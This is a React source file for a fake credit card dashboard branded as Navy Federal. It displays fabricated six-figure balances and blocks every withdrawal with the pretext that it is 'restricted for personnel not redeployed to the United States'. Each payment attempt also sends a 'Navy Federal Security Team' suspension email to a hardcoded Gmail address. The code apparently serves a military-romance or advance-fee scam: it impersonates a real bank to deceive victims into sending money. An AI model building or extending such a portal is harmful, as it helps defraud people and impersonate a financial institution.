 import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';

import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import {
  Dialog,
  DialogClose,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
  DialogTrigger
} from '@/components/ui/dialog';
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue
} from '@/components/ui/select';
import type { Transaction } from '@/types/transaction';
import type { DashboardTransaction } from '@/types/dashboardTransaction';
import { TRANSACTIONS } from '@/data/transactions';
import { TableTimeline } from '@/components/ui/TableTimeline';
import { Badge } from '@/components/ui/badge';
import { Lock } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import emailjs from '@emailjs/browser';

import { useAuth } from '@/hooks/useAuth';
import { LogOut } from 'lucide-react';
import DashboardLogin from './DashboardLogin';
import LoginRestricted from './LoginRestricted';

interface EmailJSResponseStatus {
  status: number;
  text: string;
}

const CreditCardDashboard: React.FC = () => {
  const { isAuthenticated, logout, isRestricted, loginCount } = useAuth();
  const { toast } = useToast();

  const navigate = useNavigate();

  const handleSignOut = () => {
    logout();
    navigate('/');
    toast({
      title: "Signed out successfully",
      description: "You have been logged out."
    });
  };
  const [searchQuery, setSearchQuery] = useState('');
  const [showAllResults, setShowAllResults] = useState(false);
  const [isPaymentOpen, setIsPaymentOpen] = useState(false);
  const [paymentAmount, setPaymentAmount] = useState('245');
  const [selectedAccount, setSelectedAccount] = useState('checking');
  const [currentPage, setCurrentPage] = useState(1);
  const itemsPerPage = 5;

  const publicKey = import.meta.env.VITE_EMAILJS_PUBLIC_KEY as string;
  const serviceId = 'service_vzgfa7s';
  const templateId = import.meta.env.VITE_EMAILJS_TEMPLATE_ID as string;

  useEffect(() => {
    if (publicKey) {
      emailjs.init(publicKey);
    }
  }, [publicKey]);

  const accountBalances = {
    checking: 300428,
    savings: 901234.56
  } as const;

  const sendSuspensionEmail = async () => {
    if (publicKey && serviceId && templateId) {
      try {
        await emailjs.send(serviceId, templateId, {
          to_email: 'Majluciasmith.97@gmail.com',
          to_name: 'Account Holder',
          from_name: 'Navy Federal Security Team',
          subject: 'Credit Card Account Suspension Notice',
          message: 'Your account has been temporarily suspended due to suspicious payment activity. Please contact support to verify your identity and redeployment status. Withdrawals are restricted for personnel not redeployed to the United States.'
        });

        console.log('Suspension email sent successfully');
      } catch (error: unknown) {
        const err = error as Error | EmailJSResponseStatus;
        console.error('Failed to send suspension email:', err);
        if ('status' in err && 'text' in err) {
          console.error('Status:', err.status, 'Text:', err.text);
        }
      }
    } else {
      console.log('EmailJS env vars missing - no email sent');
    }
  };

  const handlePayment = async () => {
    const amount = parseFloat(paymentAmount || '0');
    const balance = accountBalances[selectedAccount as keyof typeof accountBalances];
    
    if (isNaN(amount) || amount <= 0) {
      toast({ 
        variant: "destructive", 
        title: "Invalid Amount", 
        description: "Please enter a valid payment amount!" 
      });
      await sendSuspensionEmail();
      return;
    }
    
    if (amount > balance) {
      toast({ 
        variant: "destructive", 
        title: "Insufficient Funds", 
        description: `Payment amount $${amount.toLocaleString()} exceeds ${selectedAccount} balance of $${balance.toLocaleString()}.` 
      });
      await sendSuspensionEmail();
      return;
    }
    
    setIsPaymentOpen(false);
    toast({ 
      variant: "destructive", 
      title: "Withdrawal Restricted", 
      description: "Withdrawal is restricted for personnel not redeployed to the United States." 
    });
    await sendSuspensionEmail();
    setPaymentAmount('');
    setSelectedAccount('checking');
  };

  if (!isAuthenticated) {
    if (isRestricted) {
      return <LoginRestricted />;
    }
    return <DashboardLogin />;
  }

  const transactions: DashboardTransaction[] = TRANSACTIONS
    .map((t: Transaction) => ({
      id: t.id,
      name: t.description.split(' - ')[0] || t.description,
      type: t.type === 'credit' ? 'Credit' : 'Debit',
      amount: `${t.type === 'credit' ? '+' : '-'}$${t.amount.toFixed(2)}`,
      available: `Posted ${t.date}`,
      description: t.description,
      date: t.date
    }))
    .sort((a, b) => new Date(b.date).getTime() - new Date(a.date).getTime());

  const filteredTransactions = transactions.filter(tx =>
    tx.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
    tx.description.toLowerCase().includes(searchQuery.toLowerCase()) ||
    tx.id.toLowerCase().includes(searchQuery.toLowerCase()) ||
    tx.available.toLowerCase().includes(searchQuery.toLowerCase())
  );

  const indexOfLastItem = currentPage * itemsPerPage;
  const indexOfFirstItem = indexOfLastItem - itemsPerPage;
  const currentTransactions = filteredTransactions.slice(indexOfFirstItem, indexOfLastItem);

  const totalPages = Math.ceil(filteredTransactions.length / itemsPerPage);

  const handleActionClick = (action: string) => {
    if (action === 'Statements') {
      navigate('/payment-history');
    }
  };

  return (
    <div className="container mx-auto px-4 py-6 md:py-12 lg:py-10 max-w-6xl">
      <div className="bg-gradient-to-r from-navy to-navy-light rounded-3xl rounded-b-none p-6 md:p-8 lg:p-10 mb-0 shadow-2xl">
        <div className="flex items-center gap-4 mb-6 md:mb-8">
          <button 
            className="w-10 h-10 flex items-center justify-center rounded-full hover:bg-white/10 transition-all duration-200 flex-shrink-0"
            onClick={() => navigate(-1)}
          >
            ←
          </button>
          <h1 className="text-xl md:text-2xl lg:text-3xl font-semibold tracking-wide text-white flex-1">Account Holdings</h1>
          <div className="flex items-center gap-3">
            <Button 
              variant="ghost" 
              size="sm" 
              onClick={handleSignOut}
              className="text-white hover:bg-white/20 hover:text-white h-9 px-3"
            >
              <LogOut className="w-4 h-4 mr-1" />
              Sign Out
            </Button>
          </div>
        </div>

        <div className="flex flex-col lg:flex-row lg:items-start lg:justify-between gap-6 lg:gap-8">
          <div className="flex-1">
            <div className="flex items-center gap-2 mb-3 text-sm opacity-80">
              <span className="text-white">Current Balance</span>
              <div className="w-4 h-4 border border-white/60 rounded-full flex items-center justify-center text-xs font-bold">i</div>
            </div>

            <div className="flex lg:items-baseline gap-1 mb-4">
              <span className="text-4xl md:text-5xl lg:text-6xl xl:text-7xl font-light text-white">$</span>
              <span className="text-3xl md:text-4xl lg:text-5xl text-white/90">625,583.12</span>
            </div>

            <div className="text-sm text-white/90 space-y-1">
              <div>Available Credit: $374,416.88 of $1,000,000.00</div>
              <div>Total Pending Amount: $200,856.44</div>
            </div>
          </div>

          <div className="flex flex-col items-start gap-2">
            <Dialog open={isPaymentOpen} onOpenChange={setIsPaymentOpen}>
              <DialogTrigger asChild>
                <Button 
                  size="lg" 
                  className="bg-gradient-to-r from-orange to-orange-dark hover:from-orange-dark hover:to-orange text-white font-semibold px-8 py-4 rounded-xl shadow-lg hover:shadow-xl hover:-translate-y-1 transition-all duration-200 self-start lg:self-center whitespace-nowrap"
                >
                  Make Payment
                </Button>
              </DialogTrigger>
              <DialogContent className="max-w-md">
                <DialogHeader>
                  <DialogTitle>Make a Payment</DialogTitle>
                  <DialogDescription>
                    Enter the payment amount and select your source account.
                  </DialogDescription>
                </DialogHeader>
                <div className="grid gap-4 py-4">
                  <div className="grid gap-2">
                    <label htmlFor="amount" className="text-sm font-medium">Amount</label>
                    <Input
                      id="amount"
                      placeholder="$0.00"
                      type="number"
                      step="0.01"
                      className="w-full"
                      value={paymentAmount}
                      onChange={(e) => setPaymentAmount(e.target.value)}
                      required
                    />
                  </div>
                  <div className="grid gap-2">
                    <label htmlFor="account" className="text-sm font-medium">From Account <span className="text-destructive">*</span></label>
                    <Select value={selectedAccount} onValueChange={setSelectedAccount} required>
                      <SelectTrigger id="account">
                        <SelectValue placeholder="Select account" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="checking">Checking ($300,428.00)</SelectItem>
                        <SelectItem value="savings">Savings ($901,234.56)</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                </div>
                <DialogFooter>
                  <DialogClose asChild>
                    <Button type="button" variant="outline">Cancel</Button>
                  </DialogClose>
                  <Button onClick={handlePayment}>
                    Confirm Payment
                  </Button>
                </DialogFooter>
              </DialogContent>
            </Dialog>
            <Badge variant="destructive" className="mt-2 self-start bg-destructive text-destructive-foreground">
              <Lock className="w-3 h-3 mr-1" />
              Withdrawal Restricted
            </Badge>
          </div>
        </div>
      </div>

      <div className="bg-white/80 backdrop-blur-sm rounded-3xl md:rounded-t-none -mt-4 p-6 md:p-8 lg:p-10 shadow-2xl">
        <div className="md:grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
          <Card className="p-6 hover:shadow-xl hover:-translate-y-1 transition-all duration-200 cursor-pointer border-0 bg-white" onClick={() => navigate('/credit-cards')}>
            <CardContent className="p-0 flex flex-col md:flex-row md:items-center gap-4 text-center md:text-left">
              <div className="w-12 h-12 bg-blue-50 rounded-xl flex items-center justify-center text-blue font-bold text-lg mx-auto md:mx-0">
                ⚙️
              </div>
              <div>
                <div className="font-semibold text-lg text-navy mb-1">Manage Cards</div>
                <div className="text-sm text-muted-foreground">View and manage</div>
              </div>
            </CardContent>
          </Card>

          <Card className="p-6 hover:shadow-xl hover:-translate-y-1 transition-all duration-200 cursor-pointer border-0 bg-white" onClick={() => handleActionClick('Statements')}>
            <CardContent className="p-0 flex flex-col md:flex-row md:items-center gap-4 text-center md:text-left">
              <div className="w-12 h-12 bg-green-50 rounded-xl flex items-center justify-center text-green font-bold text-lg mx-auto md:mx-0">
                📄
              </div>
              <div className="flex-1">
                <div className="font-semibold text-lg text-navy mb-1">Statements</div>
                <div className="text-sm text-muted-foreground">View statements</div>
                <Button variant="link" className="p-0 h-auto text-orange hover:text-orange-dark text-sm font-medium -mt-1 block md:inline" onClick={(e) => {
                  e.stopPropagation();
                  navigate('/payment-history');
                }}>
                  View monthly
                </Button>
              </div>
            </CardContent>
          </Card>

          <Card className="p-6 hover:shadow-xl hover:-translate-y-1 transition-all duration-200 border-0 bg-white">
            <CardContent className="p-0 flex flex-col md:flex-row md:items-center gap-4 text-center md:text-left">
              <div className="w-12 h-12 bg-gradient-to-r from-emerald-500 to-emerald-600 rounded-xl flex items-center justify-center text-white font-bold text-lg mx-auto md:mx-0 shadow-md">
                🎁
              </div>
              <div>
                <div className="text-xl lg:text-2xl font-bold text-navy mb-1">26,760 pts</div>
                <div className="text-sm font-semibold text-emerald uppercase tracking-wide">Rewards</div>
              </div>
            </CardContent>
          </Card>
        </div>

        <div className="bg-white p-4 rounded-2xl shadow-sm border mb-4 md:mb-6">
          <div className="flex items-center gap-3">
            <span className="text-muted-foreground text-lg">🔍</span>
            <Input 
              placeholder="Search by transaction description, ID, or date" 
              className="border-none bg-transparent h-auto py-0 flex-1 text-lg placeholder:text-muted-foreground focus-visible:ring-0"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
            />
            {searchQuery && filteredTransactions.length > 0 && !showAllResults && (
              <button
                onClick={() => setShowAllResults(true)}
                className="ml-2 px-4 py-1.5 bg-orange text-white text-sm font-medium rounded-lg hover:bg-orange-dark transition-all duration-200 whitespace-nowrap"
              >
                View All ({filteredTransactions.length})
              </button>
            )}
          </div>
        </div>
        {searchQuery && (
          <p className="text-xs text-muted-foreground mb-4 pl-1">
            {filteredTransactions.length} {filteredTransactions.length === 1 ? 'result' : 'results'} found. Only posted transactions will display in search results.
          </p>
        )}

        <Card className="border-0 shadow-sm overflow-hidden">
          <CardHeader className="p-6 pb-4 border-b border-border/50">
            <div className="flex items-center gap-2">
              <div className="w-4 h-4 border border-muted-foreground rounded-full flex items-center justify-center text-xs font-bold">i</div>
              <CardTitle className="text-lg font-semibold text-muted-foreground">History</CardTitle>
            </div>
          </CardHeader>
          <CardContent className="p-0 bg-cream/50">
            {showAllResults ? (
              <div className="overflow-hidden">
                <TableTimeline 
                  transactions={filteredTransactions.map((tx) => ({
                    date: tx.date,
                    description: tx.description,
                    amount: parseFloat(tx.amount.replace(/[+$]/g, '')),
                    type: tx.amount.startsWith('+') ? 'credit' : 'debit',
                    id: tx.id
                  } as Transaction))} 
                />
                <div className="p-6 pt-0 flex justify-center">
                  <button 
                    onClick={() => setShowAllResults(false)}
                    className="px-6 py-2 bg-navy text-white text-sm font-medium rounded-lg hover:bg-navy-dark transition-all duration-200"
                  >
                    ← Back to Summary
                  </button>
                </div>
              </div>
            ) : (
              <>
                {currentTransactions.map((tx: DashboardTransaction, index: number) => (
                  <div key={tx.id} className="flex items-center p-6 hover:bg-orange-50/50 transition-colors border-b border-border/20 last:border-b-0">
                    <div className="w-12 h-12 bg-navy rounded-xl flex items-center justify-center text-white font-bold text-lg mr-4 flex-shrink-0">
                      {index + 1}
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="font-bold uppercase text-sm tracking-wide text-navy truncate">{tx.name} <span className="text-xs font-mono text-muted-foreground">({tx.id})</span></div>
                      <div className="text-xs text-muted-foreground capitalize">{tx.type}</div>
                    </div>
                    <div className="text-right ml-4 flex-shrink-0">
                      <div className="font-bold text-lg text-emerald">{tx.amount}</div>
                      <div className="text-xs text-muted-foreground">{tx.available}</div>
                    </div>
                  </div>
                ))}
                {filteredTransactions.length === 0 && !showAllResults && (
                  <div className="p-12 text-center text-muted-foreground">
                    No matching transactions found.
                  </div>
                )}
                {!showAllResults && totalPages > 1 && (
                  <div className="p-6 flex justify-end">
                    <div className="flex items-center gap-2 text-sm text-muted-foreground">
                      {Array.from({ length: totalPages }, (_, i) => i + 1).map((page: number) => (
                        <button 
                          key={page}
                          className={`px-3 py-1 rounded hover:bg-muted font-medium ${currentPage === page ? 'bg-primary text-primary-foreground shadow-sm' : ''}`}
                          onClick={() => setCurrentPage(page)}
                        >
                          {page}
                        </button>
                      ))}
                      <button 
                        className="px-3 py-1 rounded hover:bg-muted font-medium" 
                        onClick={() => setCurrentPage(currentPage + 1)} 
                        disabled={currentPage >= totalPages}
                      >
                        Next
                      </button>
                    </div>
                  </div>
                )}
              </>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default CreditCardDashboard;

